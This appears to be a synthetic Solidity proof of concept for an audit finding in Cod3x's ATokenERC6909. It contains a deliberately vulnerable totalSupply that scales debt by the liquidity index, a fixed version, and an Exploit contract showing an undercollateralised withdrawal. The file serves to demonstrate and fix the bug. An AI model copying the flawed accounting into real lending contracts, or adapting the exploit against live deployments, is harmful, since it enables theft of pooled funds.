// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Cod3x — ATokenERC6909.totalSupply scales debt by the liquidity index
    (Spearbit, #49178)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: totalSupply always rayMuls scaled supply by
    getReserveNormalizedIncome. Debt must use getReserveNormalizedVariableDebt.
    Scaled debt 100e18, income index 1e27, borrow index 2e27: reported supply
    is 100e18 and real debt is 200e18. A withdraw that trusts the reported
    number pays out 50e18 and leaves 100e18 of collateral against 200e18 of
    debt. The control uses the borrow index, reports 200e18, and the withdraw
    reverts. */

library WadRayMath {
    uint256 internal constant RAY = 1e27;

    function rayMul(uint256 a, uint256 b) internal pure returns (uint256) {
        return (a * b) / RAY;
    }
}

contract Pool {
    function getReserveNormalizedIncome(address) external pure returns (uint256) {
        return 1e27;
    }

    function getReserveNormalizedVariableDebt(address) external pure returns (uint256) {
        return 2e27;
    }
}

contract ScaledSupply {
    mapping(uint256 => uint256) public scaledOf;

    function totalSupply(uint256 id) public view virtual returns (uint256) {
        return scaledOf[id];
    }
}

contract ATokenERC6909 is ScaledSupply {
    using WadRayMath for uint256;

    Pool public POOL;
    mapping(uint256 => address) internal _underlyingAssetAddresses;
    uint256 public constant DEBT_ID = 1;

    constructor(Pool pool) {
        POOL = pool;
        scaledOf[DEBT_ID] = 100 ether;
        _underlyingAssetAddresses[DEBT_ID] = address(1);
    }

    // ATokenERC6909.sol — totalSupply
    function totalSupply(uint256 id) public view override returns (uint256) {
        uint256 currentSupplyScaled = super.totalSupply(id);
        if (currentSupplyScaled == 0) {
            return 0;
        }
        // @> VULN: debt ids are scaled by the liquidity index, not the borrow index
        return currentSupplyScaled.rayMul(POOL.getReserveNormalizedIncome(_underlyingAssetAddresses[id]));
        // FIX: POOL.getReserveNormalizedVariableDebt(_underlyingAssetAddresses[id])
    }

    function realDebt(uint256 id) public view returns (uint256) {
        return super.totalSupply(id).rayMul(POOL.getReserveNormalizedVariableDebt(_underlyingAssetAddresses[id]));
    }
}

contract ATokenERC6909Fixed is ScaledSupply {
    using WadRayMath for uint256;

    Pool public POOL;
    mapping(uint256 => address) internal _underlyingAssetAddresses;

    constructor(Pool pool) {
        POOL = pool;
        scaledOf[1] = 100 ether;
        _underlyingAssetAddresses[1] = address(1);
    }

    function totalSupply(uint256 id) public view override returns (uint256) {
        uint256 currentSupplyScaled = super.totalSupply(id);
        if (currentSupplyScaled == 0) {
            return 0;
        }
        return currentSupplyScaled.rayMul(POOL.getReserveNormalizedVariableDebt(_underlyingAssetAddresses[id]));
    }
}

contract Collateral {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Market {
    Collateral public token;
    ATokenERC6909 public aToken;
    uint256 public collateral = 150 ether;
    uint256 public reported;
    uint256 public paid;

    constructor(Collateral _token, ATokenERC6909 _aToken) {
        token = _token;
        aToken = _aToken;
    }

    function withdraw(uint256 amount) external {
        uint256 debt = aToken.totalSupply(aToken.DEBT_ID());
        reported = debt;
        require(collateral - amount >= debt, "hf");
        collateral -= amount;
        token.transfer(msg.sender, amount);
        paid = amount;
    }
}

contract MarketFixed {
    Collateral public token;
    ATokenERC6909Fixed public aToken;
    uint256 public collateral = 150 ether;
    uint256 public reported;
    uint256 public paid;

    constructor(Collateral _token, ATokenERC6909Fixed _aToken) {
        token = _token;
        aToken = _aToken;
    }

    function withdraw(uint256 amount) external {
        uint256 debt = aToken.totalSupply(1);
        reported = debt;
        require(collateral - amount >= debt, "hf");
        collateral -= amount;
        token.transfer(msg.sender, amount);
        paid = amount;
    }
}

contract Exploit {
    Collateral public token; // nonce 1
    Pool public pool; // nonce 2
    ATokenERC6909 public aToken; // nonce 3
    Market public market; // nonce 4

    constructor() {
        token = new Collateral();
        pool = new Pool();
        aToken = new ATokenERC6909(pool);
        market = new Market(token, aToken);
    }

    function run() external {
        token.mint(address(market), 150 ether);
        require(token.balanceOf(address(market)) == 150 ether, "collateral");
        uint256 reported = aToken.totalSupply(1);
        uint256 real = aToken.realDebt(1);
        require(reported == 100 ether, "reported 100e18");
        require(real == 200 ether, "real debt 200e18");
        market.withdraw(50 ether);
        require(market.reported() == 100 ether, "withdraw used 100e18");
        require(market.paid() == 50 ether, "paid 50e18");
        require(token.balanceOf(address(this)) == 50 ether, "borrower received 50e18");
        require(token.balanceOf(address(market)) == 100 ether, "100e18 left");
        require(real > token.balanceOf(address(market)), "short versus real debt");
    }
}
